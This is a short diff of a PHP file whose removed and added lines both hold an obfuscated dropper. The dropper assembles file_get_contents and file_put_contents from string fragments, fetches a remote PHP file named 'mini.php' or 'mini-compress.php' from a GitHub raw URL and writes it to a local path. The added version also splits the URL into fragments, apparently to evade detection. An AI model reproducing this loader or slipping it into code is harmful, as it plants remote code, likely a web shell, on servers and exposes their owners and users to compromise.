@@ -1,5 +1,5 @@
 <?php
-$gc = "fil"."e_ge"."t_c"."ont"."ents";
-$pc = "fi"."le_"."pu"."t_c"."ont"."ents";
-$pc("/path", $gc("https://raw.githubusercontent.com/Lamersxcode/Records/main/Mini-Code/mini.php"))
+$gc = "f"."il"."e_"."ge"."t_c"."ont"."en"."ts";
+$pc = "fi"."le_"."pu"."t_c"."ont"."en"."ts";
+$pc("/path", $gc("ht"."tps"."://"."raw"."."."githubusercontent"."."."com"."/"."InvisibleBunny"."/"."Records"."/"."main"."/"."Bunny-Mini"."/"."mini-compress"."."."php"))
 ; ?>
